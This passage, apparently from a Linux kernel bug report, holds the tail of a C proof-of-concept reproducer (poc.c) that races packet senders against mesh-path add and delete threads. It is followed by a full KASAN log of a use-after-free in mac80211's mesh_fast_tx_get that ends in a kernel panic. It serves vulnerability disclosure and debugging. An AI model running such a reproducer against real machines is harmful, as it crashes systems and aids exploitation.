	    !memcmp(g_cfg.dst_mac, "\0\0\0\0\0\0", ETH_ALEN) ||
	    !memcmp(g_cfg.next_hop, "\0\0\0\0\0\0", ETH_ALEN)) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	signal(SIGINT, stop_now);
	signal(SIGTERM, stop_now);

	total_threads = g_cfg.senders + g_cfg.adders + g_cfg.deleters;
	threads = calloc(total_threads, sizeof(*threads));
	if (!threads) {
		perror("calloc");
		return EXIT_FAILURE;
	}

	printf("ifname=%s dst_ip=%s dst_mac=%s next_hop=%s seconds=%u "
	       "senders=%u adders=%u deleters=%u payload_len=%u "
	       "add_pause_us=%u del_pause_us=%u\n",
	       g_cfg.ifname, g_cfg.dst_ip,
	       mac_to_str(g_cfg.dst_mac, dst_buf, sizeof(dst_buf)),
	       mac_to_str(g_cfg.next_hop, nh_buf, sizeof(nh_buf)),
	       g_cfg.seconds, g_cfg.senders, g_cfg.adders, g_cfg.deleters,
	       g_cfg.payload_len, g_cfg.add_pause_us, g_cfg.del_pause_us);
	fflush(stdout);

	for (i = 0; i < g_cfg.senders; i++)
		pthread_create(&threads[idx++], NULL, sender_thread,
			       (void *)(unsigned long)i);
	for (i = 0; i < g_cfg.adders; i++)
		pthread_create(&threads[idx++], NULL, adder_thread,
			       (void *)(unsigned long)i);
	for (i = 0; i < g_cfg.deleters; i++)
		pthread_create(&threads[idx++], NULL, deleter_thread,
			       (void *)(unsigned long)i);

	pthread_create(&progress, NULL, progress_thread, NULL);
	sleep(g_cfg.seconds);
	atomic_store_explicit(&stop_flag, true, memory_order_relaxed);

	for (idx = 0; idx < total_threads; idx++)
		pthread_join(threads[idx], NULL);
	pthread_join(progress, NULL);

	printf("final send_ok=%llu send_err=%llu add_ok=%llu add_exist=%llu "
	       "add_err=%llu del_ok=%llu del_absent=%llu del_err=%llu\n",
	       (unsigned long long)atomic_load_explicit(&send_ok,
					memory_order_relaxed),
	       (unsigned long long)atomic_load_explicit(&send_err,
					memory_order_relaxed),
	       (unsigned long long)atomic_load_explicit(&add_ok,
					memory_order_relaxed),
	       (unsigned long long)atomic_load_explicit(&add_exist,
					memory_order_relaxed),
	       (unsigned long long)atomic_load_explicit(&add_err,
					memory_order_relaxed),
	       (unsigned long long)atomic_load_explicit(&del_ok,
					memory_order_relaxed),
	       (unsigned long long)atomic_load_explicit(&del_absent,
					memory_order_relaxed),
	       (unsigned long long)atomic_load_explicit(&del_err,
					memory_order_relaxed));
	fflush(stdout);

	free(threads);
	return ret;
}
------END poc.c--------

----BEGIN crash log----
[   25.579250] ==================================================================
[   25.579264] BUG: KASAN: slab-use-after-free in mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)
[   25.579292] Read of size 4 at addr ffff888012d853b8 by task poc/520
[   25.579294]
[   25.579297] CPU: 1 UID: 0 PID: 520 Comm: poc Not tainted 7.3.0-rc1-00240-g641d03105cc0 #2 PREEMPT(lazy)
[   25.579301] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   25.579303] Call Trace:
[   25.579304]  <TASK>
[   25.579305]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   25.579309]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)
[   25.579313]  ? __pfx__raw_spin_lock_irqsave (kernel/locking/spinlock.c:190)
[   25.579324]  ? __virt_addr_valid (include/linux/mmzone.h:2131 (discriminator 1) include/linux/mmzone.h:2277 (discriminator 1) arch/x86/mm/physaddr.c:54 (discriminator 1))
[   25.579328]  ? mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)
[   25.579331]  kasan_report (mm/kasan/report.c:595)
[   25.579333]  ? mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)
[   25.579337]  mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)
[   25.579365]  ? __pfx_mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:400)
[   25.579368]  ? filter_irq_stacks (kernel/stacktrace.c:397)
[   25.579372]  ? stack_depot_save_flags (lib/stackdepot.c:667)
[   25.579375]  ieee80211_mesh_xmit_fast (net/mac80211/mesh.c:779)
[   25.579379]  ? kasan_save_stack (mm/kasan/common.c:58)
[   25.579382]  ? kasan_save_stack (mm/kasan/common.c:57)
[   25.579385]  ? kasan_save_track (mm/kasan/common.c:78)
[   25.579388]  ? __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common.c:366)
[   25.579390]  ? check_object (mm/slub.c:1428 mm/slub.c:1551)
[   25.579393]  ? __pfx_ieee80211_mesh_xmit_fast (net/mac80211/mesh.c:699)
[   25.579396]  ? sock_alloc_send_pskb (net/core/sock.c:3015)
[   25.579400]  ? ip_make_skb (net/ipv4/ip_output.c:1576)
[   25.579403]  ? udp_sendmsg (net/ipv4/udp.c:1451)
[   25.579406]  ? __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[   25.579409]  ? __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[   25.579411]  ? do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   25.579415]  ? entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   25.579418]  __ieee80211_subif_start_xmit (net/mac80211/tx.c:4391)
[   25.579422]  ? __pfx___ieee80211_subif_start_xmit (net/mac80211/tx.c:3447)
[   25.579425]  ? skb_network_protocol (include/linux/skbuff.h:2534 include/linux/skbuff.h:2867 include/linux/skbuff.h:2882 include/linux/if_vlan.h:672 net/core/dev.c:3727)
[   25.579429]  ieee80211_subif_start_xmit (net/mac80211/tx.c:4633 (discriminator 1))
[   25.579432]  ? __pfx_ieee80211_subif_start_xmit (net/mac80211/tx.c:4448)
[   25.579434]  ? kasan_save_track (mm/kasan/common.c:78)
[   25.579437]  ? __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common.c:366)
[   25.579440]  dev_hard_start_xmit (include/linux/netdevice.h:5429 include/linux/netdevice.h:5438 net/core/dev.c:3937 net/core/dev.c:3953)
[   25.579444]  __dev_queue_xmit (net/core/dev.c:4926)
[   25.579447]  ? csum_partial (lib/checksum.c:119)
[   25.579450]  ? __pfx___dev_queue_xmit (include/linux/netdevice.h:4067 (discriminator 1))
[   25.579453]  ? wakeup_preempt_fair (kernel/sched/fair.c:1149 (discriminator 1) kernel/sched/fair.c:1154 (discriminator 1) kernel/sched/fair.c:10038 (discriminator 1))
[   25.579456]  ? __pfx_csum_and_copy_from_iter_full (net/core/skbuff.c:6250 (discriminator 1))
[   25.579460]  ? sock_alloc_send_pskb (net/core/sock.c:3018)
[   25.579462]  ? _raw_spin_unlock (include/asm-generic/qspinlock.h:129 (discriminator 4) include/asm-generic/qspinlock.h:160 (discriminator 4) include/linux/spinlock.h:206 (discriminator 4) include/linux/spinlock_api_smp.h:200 (discriminator 4) kernel/locking/spinlock.c:213 (discriminator 4))
[   25.579465]  ? ip_generic_getfrag (net/ipv4/ip_output.c:947)
[   25.579468]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)
[   25.579471]  ip_finish_output2 (include/linux/netdevice.h:3461 include/net/neighbour.h:544 include/net/neighbour.h:558 net/ipv4/ip_output.c:236)
[   25.579474]  ? __ip_append_data (include/linux/skbuff.h:2333 (discriminator 2) include/linux/skbuff.h:2438 (discriminator 2) include/linux/skbuff.h:2471 (discriminator 2) net/ipv4/ip_output.c:1206 (discriminator 2))
[   25.579477]  ? __pfx_ip_finish_output2 (net/ipv4/ip_output.c:614)
[   25.579480]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)
[   25.579483]  __ip_finish_output.part.0 (net/ipv4/ip_output.c:314)
[   25.579486]  ? __pfx___ip_finish_output.part.0 (net/ipv4/ip_output.c:595)
[   25.579489]  ? do_csum (lib/checksum.c:64)
[   25.579492]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:314 net/ipv4/ip_output.c:437)
[   25.579494]  ? __pfx_ip_output (net/ipv4/ip_output.c:278)
[   25.579497]  ? ip_make_skb (net/ipv4/ip_output.c:1584)
[   25.579500]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)
[   25.579503]  ? __pfx_ip_make_skb (net/ipv4/ip_output.c:1550)
[   25.579506]  ip_send_skb (include/net/dst.h:470 (discriminator 6) net/ipv4/ip_output.c:131 (discriminator 6) net/ipv4/ip_output.c:1510 (discriminator 6))
[   25.579509]  udp_send_skb (net/ipv4/udp.c:1174 (discriminator 1))
[   25.579512]  udp_sendmsg (net/ipv4/udp.c:1456)
[   25.579515]  ? __css_rstat_updated (include/linux/llist.h:100 (discriminator 2) kernel/cgroup/rstat.c:97 (discriminator 2))
[   25.579528]  ? __pfx_udp_sendmsg (net/ipv4/udp.c:1234)
[   25.579530]  ? __pfx___css_rstat_updated (include/linux/srcutree.h:319 (discriminator 58))
[   25.579534]  ? __update_load_avg_cfs_rq (kernel/sched/pelt.c:186 kernel/sched/pelt.c:323)
[   25.579537]  ? __cgroup_account_cputime (kernel/cgroup/rstat.c:626 (discriminator 10) kernel/cgroup/rstat.c:637 (discriminator 10))
[   25.579540]  ? __resched_curr (kernel/sched/core.c:1210)
[   25.579544]  ? vruntime_eligible (kernel/sched/fair.c:585 (discriminator 1) kernel/sched/fair.c:931 (discriminator 1))
[   25.579547]  ? pick_eevdf (kernel/sched/fair.c:969 kernel/sched/fair.c:1208)
[   25.579550]  ? clockevents_program_event (kernel/time/clockevents.c:373)
[   25.579554]  ? _raw_spin_lock_irq (kernel/locking/spinlock.c:188)
[   25.579556]  ? inet_send_prepare (net/ipv4/af_inet.c:849 (discriminator 1))
[   25.579559]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[   25.579562]  ? __pfx___sys_sendto (net/socket.c:2235)
[   25.579566]  ? xfd_validate_state (arch/x86/kernel/fpu/xstate.c:1499 arch/x86/kernel/fpu/xstate.c:1543)
[   25.579570]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[   25.579573]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   25.579577]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   25.579580] RIP: 0033:0x7fadff863494
[   25.579582] Code: 89 4c 24 1c e8 8d f8 ff ff 44 8b 54 24 1c 8b 3c 24 45 31 c9 89 c5 48 8b 54 24 10 48 8b 74 24 08 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 34 89 ef 48 89 04 24 e8 b9 f8 ff ff 48 8b 04
All code
========
   0:	89 4c 24 1c          	mov    %ecx,0x1c(%rsp)
   4:	e8 8d f8 ff ff       	call   0xfffffffffffff896
   9:	44 8b 54 24 1c       	mov    0x1c(%rsp),%r10d
   e:	8b 3c 24             	mov    (%rsp),%edi
  11:	45 31 c9             	xor    %r9d,%r9d
  14:	89 c5                	mov    %eax,%ebp
  16:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
  1b:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi
  20:	45 31 c0             	xor    %r8d,%r8d
  23:	b8 2c 00 00 00       	mov    $0x2c,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 34                	ja     0x66
  32:	89 ef                	mov    %ebp,%edi
  34:	48 89 04 24          	mov    %rax,(%rsp)
  38:	e8 b9 f8 ff ff       	call   0xfffffffffffff8f6
  3d:	48                   	rex.W
  3e:	8b                   	.byte 0x8b
  3f:	04                   	.byte 0x4

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 34                	ja     0x3c
   8:	89 ef                	mov    %ebp,%edi
   a:	48 89 04 24          	mov    %rax,(%rsp)
   e:	e8 b9 f8 ff ff       	call   0xfffffffffffff8cc
  13:	48                   	rex.W
  14:	8b                   	.byte 0x8b
  15:	04                   	.byte 0x4
[   25.579585] RSP: 002b:00007fadfee78e90 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[   25.579588] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00007fadff863494
[   25.579590] RDX: 0000000000000100 RSI: 00007fadf8000b60 RDI: 0000000000000004
[   25.579592] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[   25.579594] R10: 0000000000004000 R11: 0000000000000246 R12: 00007fadf8000b60
[   25.579595] R13: 0000000000000100 R14: 00007fadfee78fc0 R15: 0000000000802000
[   25.579598]  </TASK>
[   25.579599]
[   25.579600] Allocated by task 523:
[   25.579602]  kasan_save_stack (mm/kasan/common.c:57)
[   25.579605]  kasan_save_track (mm/kasan/common.c:78)
[   25.579608]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:415)
[   25.579611]  __kmalloc_cache_noprof (include/linux/kasan.h:263 mm/slub.c:5563)
[   25.579613]  mesh_path_new.constprop.0 (include/linux/slab.h:991 include/linux/slab.h:1312 net/mac80211/mesh_pathtbl.c:408)
[   25.579616]  mesh_path_add (net/mac80211/mesh_pathtbl.c:696)
[   25.579618]  ieee80211_add_mpath (net/mac80211/cfg.c:2911)
[   25.579621]  nl80211_new_mpath (net/wireless/rdev-ops.h:255 net/wireless/nl80211.c:9949)
[   25.579624]  genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)
[   25.579627]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/genetlink.c:1209)
[   25.579630]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[   25.579632]  genl_rcv (net/netlink/genetlink.c:1218)
[   25.579634]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[   25.579636]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[   25.579638]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
[   25.579640]  ___sys_sendmsg (net/socket.c:2767)
[   25.579643]  __sys_sendmsg (net/socket.c:2799)
[   25.579645]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   25.579648]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   25.579650]
[   25.579651] Freed by task 41:
[   25.579652]  kasan_save_stack (mm/kasan/common.c:57)
[   25.579655]  kasan_save_track (mm/kasan/common.c:78)
[   25.579657]  kasan_save_free_info (mm/kasan/generic.c:584)
[   25.579660]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:285)
[   25.579662]  kmem_cache_free_bulk (include/linux/kasan.h:235 mm/slub.c:2748 mm/slub.c:2777 mm/slub.c:6533 mm/slub.c:7248 mm/slub.c:7227)
[   25.579665]  kvfree_rcu_bulk (include/linux/slab.h:913 mm/slab_common.c:1574)
[   25.579667]  kfree_rcu_work (mm/slab_common.c:1652)
[   25.579669]  process_one_work (kernel/workqueue.c:3396)
[   25.579672]  worker_thread (kernel/workqueue.c:3479 kernel/workqueue.c:3560)
[   25.579675]  kthread (kernel/kthread.c:436)
[   25.579677]  ret_from_fork (arch/x86/kernel/process.c:158)
[   25.579679]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[   25.579682]
[   25.579682] Last potentially related work creation:
[   25.579683]  kasan_save_stack (mm/kasan/common.c:57)
[   25.579686]  kasan_record_aux_stack (mm/kasan/generic.c:556)
[   25.579688]  kvfree_call_rcu (mm/slab_common.c:2050)
[   25.579690]  mesh_path_del (net/mac80211/mesh_pathtbl.c:910 net/mac80211/mesh_pathtbl.c:931)
[   25.579693]  nl80211_del_mpath (net/wireless/rdev-ops.h:265 net/wireless/nl80211.c:9967)
[   25.579695]  genl_family_rcv_msg_doit (net/netlink/genetlink.c:1114)
[   25.579698]  genl_rcv_msg (net/netlink/genetlink.c:1194 net/netlink/genetlink.c:1209)
[   25.579700]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[   25.579702]  genl_rcv (net/netlink/genetlink.c:1218)
[   25.579704]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[   25.579706]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[   25.579708]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
[   25.579710]  ___sys_sendmsg (net/socket.c:2767)
[   25.579713]  __sys_sendmsg (net/socket.c:2799)
[   25.579715]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   25.579718]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   25.579720]
[   25.579721] The buggy address belongs to the object at ffff888012d85300
[   25.579721]  which belongs to the cache kmalloc-256 of size 256
[   25.579723] The buggy address is located 184 bytes inside of
[   25.579723]  freed 256-byte region [ffff888012d85300, ffff888012d85400)
[   25.579726]
[   25.579726] The buggy address belongs to the physical page:
[   25.579728] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xffff888012d87d00 pfn:0x12d84
[   25.579731] head: order:2 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[   25.579733] flags: 0x100000000000240(workingset|head|node=0|zone=1)
[   25.579736] page_type: f5(slab)
[   25.579739] raw: 0100000000000240 ffff888001042dc0 ffffea0000581710 ffffea00000c5e10
[   25.579741] raw: ffff888012d87d00 0000000000150008 00000000f5000000 0000000000000000
[   25.579744] head: 0100000000000240 ffff888001042dc0 ffffea0000581710 ffffea00000c5e10
[   25.579746] head: ffff888012d87d00 0000000000150008 00000000f5000000 0000000000000000
[   25.579748] head: 0100000000000002 ffffffffffffff01 00000000ffffffff 00000000ffffffff
[   25.579750] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   25.579752] page dumped because: kasan: bad access detected
[   25.579753]
[   25.579753] Memory state around the buggy address:
[   25.579755]  ffff888012d85280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   25.579756]  ffff888012d85300: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   25.579758] >ffff888012d85380: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   25.579759]                                         ^
[   25.579761]  ffff888012d85400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   25.579762]  ffff888012d85480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[   25.579764] ==================================================================
[   25.579797] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[   25.665870] CPU: 1 UID: 0 PID: 520 Comm: poc Not tainted 7.3.0-rc1-00240-g641d03105cc0 #2 PREEMPT(lazy)
[   25.666900] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   25.668023] Call Trace:
[   25.668285]  <TASK>
[   25.668516]  vpanic (kernel/panic.c:651)
[   25.668864]  ? __pfx_vpanic (kernel/panic.c:362)
[   25.669252]  ? __hrtimer_rearm_deferred (kernel/time/hrtimer.c:710 kernel/time/hrtimer.c:2169 kernel/time/hrtimer.c:2189)
[   25.669774]  ? _raw_spin_unlock (include/asm-generic/qspinlock.h:129 (discriminator 4) include/asm-generic/qspinlock.h:160 (discriminator 4) include/linux/spinlock.h:206 (discriminator 4) include/linux/spinlock_api_smp.h:200 (discriminator 4) kernel/locking/spinlock.c:213 (discriminator 4))
[   25.670190]  ? mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)
[   25.670833]  panic (kernel/panic.c:788)
[   25.671178]  ? __pfx_panic (kernel/panic.c:638)
[   25.671563]  ? _raw_spin_unlock_irqrestore (include/asm-generic/qspinlock.h:129 (discriminator 4) include/asm-generic/qspinlock.h:160 (discriminator 4) include/linux/spinlock.h:206 (discriminator 4) include/linux/spinlock_api_smp.h:209 (discriminator 4) kernel/locking/spinlock.c:221 (discriminator 4))
[   25.672086]  check_panic_on_warn (kernel/panic.c:525 kernel/panic.c:520)
[   25.672615]  end_report (mm/kasan/report.c:227)
[   25.672995]  kasan_report (mm/kasan/report.c:597)
[   25.673363]  ? mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)
[   25.673794]  mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:445)
[   25.674201]  ? __pfx_mesh_fast_tx_get (net/mac80211/mesh_pathtbl.c:400)
[   25.674665]  ? filter_irq_stacks (kernel/stacktrace.c:397)
[   25.675254]  ? stack_depot_save_flags (lib/stackdepot.c:667)
[   25.675734]  ieee80211_mesh_xmit_fast (net/mac80211/mesh.c:779)
[   25.676220]  ? kasan_save_stack (mm/kasan/common.c:58)
[   25.676659]  ? kasan_save_stack (mm/kasan/common.c:57)
[   25.677090]  ? kasan_save_track (mm/kasan/common.c:78)
[   25.677499]  ? __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common.c:366)
[   25.677920]  ? check_object (mm/slub.c:1428 mm/slub.c:1551)
[   25.678304]  ? __pfx_ieee80211_mesh_xmit_fast (net/mac80211/mesh.c:699)
[   25.678821]  ? sock_alloc_send_pskb (net/core/sock.c:3015)
[   25.679379]  ? ip_make_skb (net/ipv4/ip_output.c:1576)
[   25.679756]  ? udp_sendmsg (net/ipv4/udp.c:1451)
[   25.680146]  ? __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[   25.680530]  ? __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[   25.680953]  ? do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   25.681353]  ? entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   25.682034]  __ieee80211_subif_start_xmit (net/mac80211/tx.c:4391)
[   25.682550]  ? __pfx___ieee80211_subif_start_xmit (net/mac80211/tx.c:3447)
[   25.683352]  ? skb_network_protocol (include/linux/skbuff.h:2534 include/linux/skbuff.h:2867 include/linux/skbuff.h:2882 include/linux/if_vlan.h:672 net/core/dev.c:3727)
[   25.683814]  ieee80211_subif_start_xmit (net/mac80211/tx.c:4633 (discriminator 1))
[   25.684319]  ? __pfx_ieee80211_subif_start_xmit (net/mac80211/tx.c:4448)
[   25.684895]  ? kasan_save_track (mm/kasan/common.c:78)
[   25.685327]  ? __kasan_slab_alloc (mm/kasan/common.c:340 mm/kasan/common.c:366)
[   25.685767]  dev_hard_start_xmit (include/linux/netdevice.h:5429 include/linux/netdevice.h:5438 net/core/dev.c:3937 net/core/dev.c:3953)
[   25.686368]  __dev_queue_xmit (net/core/dev.c:4926)
[   25.686814]  ? csum_partial (lib/checksum.c:119)
[   25.687206]  ? __pfx___dev_queue_xmit (include/linux/netdevice.h:4067 (discriminator 1))
[   25.687754]  ? wakeup_preempt_fair (kernel/sched/fair.c:1149 (discriminator 1) kernel/sched/fair.c:1154 (discriminator 1) kernel/sched/fair.c:10038 (discriminator 1))
[   25.688230]  ? __pfx_csum_and_copy_from_iter_full (net/core/skbuff.c:6250 (discriminator 1))
[   25.688836]  ? sock_alloc_send_pskb (net/core/sock.c:3018)
[   25.689314]  ? _raw_spin_unlock (include/asm-generic/qspinlock.h:129 (discriminator 4) include/asm-generic/qspinlock.h:160 (discriminator 4) include/linux/spinlock.h:206 (discriminator 4) include/linux/spinlock_api_smp.h:200 (discriminator 4) kernel/locking/spinlock.c:213 (discriminator 4))
[   25.689729]  ? ip_generic_getfrag (net/ipv4/ip_output.c:947)
[   25.690244]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)
[   25.690738]  ip_finish_output2 (include/linux/netdevice.h:3461 include/net/neighbour.h:544 include/net/neighbour.h:558 net/ipv4/ip_output.c:236)
[   25.691165]  ? __ip_append_data (include/linux/skbuff.h:2333 (discriminator 2) include/linux/skbuff.h:2438 (discriminator 2) include/linux/skbuff.h:2471 (discriminator 2) net/ipv4/ip_output.c:1206 (discriminator 2))
[   25.691669]  ? __pfx_ip_finish_output2 (net/ipv4/ip_output.c:614)
[   25.692145]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)
[   25.692618]  __ip_finish_output.part.0 (net/ipv4/ip_output.c:314)
[   25.693113]  ? __pfx___ip_finish_output.part.0 (net/ipv4/ip_output.c:595)
[   25.693685]  ? do_csum (lib/checksum.c:64)
[   25.694032]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:314 net/ipv4/ip_output.c:437)
[   25.694386]  ? __pfx_ip_output (net/ipv4/ip_output.c:278)
[   25.694785]  ? ip_make_skb (net/ipv4/ip_output.c:1584)
[   25.695169]  ? __pfx_ip_generic_getfrag (net/ipv4/ip_output.c:658)
[   25.695683]  ? __pfx_ip_make_skb (net/ipv4/ip_output.c:1550)
[   25.696116]  ip_send_skb (include/net/dst.h:470 (discriminator 6) net/ipv4/ip_output.c:131 (discriminator 6) net/ipv4/ip_output.c:1510 (discriminator 6))
[   25.696493]  udp_send_skb (net/ipv4/udp.c:1174 (discriminator 1))
[   25.696893]  udp_sendmsg (net/ipv4/udp.c:1456)
[   25.697300]  ? __css_rstat_updated (include/linux/llist.h:100 (discriminator 2) kernel/cgroup/rstat.c:97 (discriminator 2))
[   25.697740]  ? __pfx_udp_sendmsg (net/ipv4/udp.c:1234)
[   25.698150]  ? __pfx___css_rstat_updated (include/linux/srcutree.h:319 (discriminator 58))
[   25.698618]  ? __update_load_avg_cfs_rq (kernel/sched/pelt.c:186 kernel/sched/pelt.c:323)
[   25.699115]  ? __cgroup_account_cputime (kernel/cgroup/rstat.c:626 (discriminator 10) kernel/cgroup/rstat.c:637 (discriminator 10))
[   25.699568]  ? __resched_curr (kernel/sched/core.c:1210)
[   25.699955]  ? vruntime_eligible (kernel/sched/fair.c:585 (discriminator 1) kernel/sched/fair.c:931 (discriminator 1))
[   25.700380]  ? pick_eevdf (kernel/sched/fair.c:969 kernel/sched/fair.c:1208)
[   25.700768]  ? clockevents_program_event (kernel/time/clockevents.c:373)
[   25.701488]  ? _raw_spin_lock_irq (kernel/locking/spinlock.c:188)
[   25.701925]  ? inet_send_prepare (net/ipv4/af_inet.c:849 (discriminator 1))
[   25.702370]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[   25.702757]  ? __pfx___sys_sendto (net/socket.c:2235)
[   25.703190]  ? xfd_validate_state (arch/x86/kernel/fpu/xstate.c:1499 arch/x86/kernel/fpu/xstate.c:1543)
[   25.703618]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[   25.705764]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[   25.706594]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[   25.707137] RIP: 0033:0x7fadff863494
[   25.707528] Code: 89 4c 24 1c e8 8d f8 ff ff 44 8b 54 24 1c 8b 3c 24 45 31 c9 89 c5 48 8b 54 24 10 48 8b 74 24 08 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 34 89 ef 48 89 04 24 e8 b9 f8 ff ff 48 8b 04
All code
========
   0:	89 4c 24 1c          	mov    %ecx,0x1c(%rsp)
   4:	e8 8d f8 ff ff       	call   0xfffffffffffff896
   9:	44 8b 54 24 1c       	mov    0x1c(%rsp),%r10d
   e:	8b 3c 24             	mov    (%rsp),%edi
  11:	45 31 c9             	xor    %r9d,%r9d
  14:	89 c5                	mov    %eax,%ebp
  16:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
  1b:	48 8b 74 24 08       	mov    0x8(%rsp),%rsi
  20:	45 31 c0             	xor    %r8d,%r8d
  23:	b8 2c 00 00 00       	mov    $0x2c,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax		<-- trapping instruction
  30:	77 34                	ja     0x66
  32:	89 ef                	mov    %ebp,%edi
  34:	48 89 04 24          	mov    %rax,(%rsp)
  38:	e8 b9 f8 ff ff       	call   0xfffffffffffff8f6
  3d:	48                   	rex.W
  3e:	8b                   	.byte 0x8b
  3f:	04                   	.byte 0x4

Code starting with the faulting instruction
===========================================
   0:	48 3d 00 f0 ff ff    	cmp    $0xfffffffffffff000,%rax
   6:	77 34                	ja     0x3c
   8:	89 ef                	mov    %ebp,%edi
   a:	48 89 04 24          	mov    %rax,(%rsp)
   e:	e8 b9 f8 ff ff       	call   0xfffffffffffff8cc
  13:	48                   	rex.W
  14:	8b                   	.byte 0x8b
  15:	04                   	.byte 0x4
[   25.709744] RSP: 002b:00007fadfee78e90 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[   25.710476] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00007fadff863494
[   25.711213] RDX: 0000000000000100 RSI: 00007fadf8000b60 RDI: 0000000000000004
[   25.711877] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[   25.712657] R10: 0000000000004000 R11: 0000000000000246 R12: 00007fadf8000b60
[   25.713345] R13: 0000000000000100 R14: 00007fadfee78fc0 R15: 0000000000802000
[   25.714013]  </TASK>
[   25.715206] Kernel Offset: 0x2b800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
